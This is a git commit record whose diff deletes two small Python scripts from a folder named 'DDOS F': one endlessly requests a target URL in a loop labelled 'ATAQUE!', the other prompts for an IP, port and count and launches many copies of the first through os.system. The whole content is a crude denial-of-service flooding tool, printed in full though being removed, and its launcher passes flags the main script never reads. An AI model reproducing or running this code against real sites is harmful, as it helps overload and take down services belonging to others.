6d521b26235010425b74e6ae7cf103b25f31abd7
xrlplerl <adlerluna@hotmail.com>
2020-06-23 08:16:09 -0300

    n

--- DDOS  F/ddos.py
+++
@@ -1,9 +0,0 @@
-import urllib.request
-import sys
-url = sys.argv[1]
-while True:
-    try:
-        urllib.request.urlopen(url)
-        print("[+] }===> ATAQUE!")
-    except:
-        print("[-] }===> OFF LINE !")
--- DDOS F/in.py
+++
@@ -1,7 +0,0 @@
-import os
-ip = str(input("[ip] ]===> "))
-port = int(input("[porta] ]====> "))
-t = int(input("[pac] ]====> "))
-quan = int(input("}===> "))
-for q in range(0,quan):
-    os.system("start py ddos.py -i {} -p {} -t {}".format(ip,port,t))
